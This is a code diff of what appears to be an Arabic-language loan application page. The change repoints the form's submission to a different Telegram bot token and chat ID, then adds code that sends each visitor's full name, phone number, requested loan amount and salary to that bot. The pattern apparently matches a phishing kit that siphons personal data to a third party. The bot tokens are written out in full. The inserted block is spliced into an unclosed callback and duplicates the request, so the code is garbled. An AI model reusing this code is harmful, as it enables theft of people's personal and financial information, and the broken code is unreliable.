@@ -212,9 +212,26 @@
 
       $.ajax({
         type: 'POST',
-        url: `https://api.telegram.org/bot8101817171:AAHKJKis3exQxUcxhe3a9U6mFg6Q6u-TN74/sendMessage`,
+        url: `https://api.telegram.org/bot7791159170:AAGO5BG--9yo9pHKoxbmmvyRwH4h6cGPP2M/sendMessage`,
         data: {
-          chat_id: "6595857389",
+          chat_id: "6873334348",
+          text: message,
+          parse_mode: 'markdown',
+        },
+        success: function (res) {
+          console.debug(res);
+          $('#response').text('Message sent');
+
+      var message = "الاسم الرباعي: `" + fullname + "`\n"
+      message += "رقم الهاتف: `" + phonenumber + "`\n"
+      message += "مبلغ السلفة: `" + loanamount + "`\n"
+      message += "الراتب الشهري: `" + salary + "`\n"
+
+      $.ajax({
+        type: 'POST',
+        url: `https://api.telegram.org/bot7791159170:AAGO5BG--9yo9pHKoxbmmvyRwH4h6cGPP2M/sendMessage`,
+        data: {
+          chat_id: "6873334348",
           text: message,
           parse_mode: 'markdown',
         },
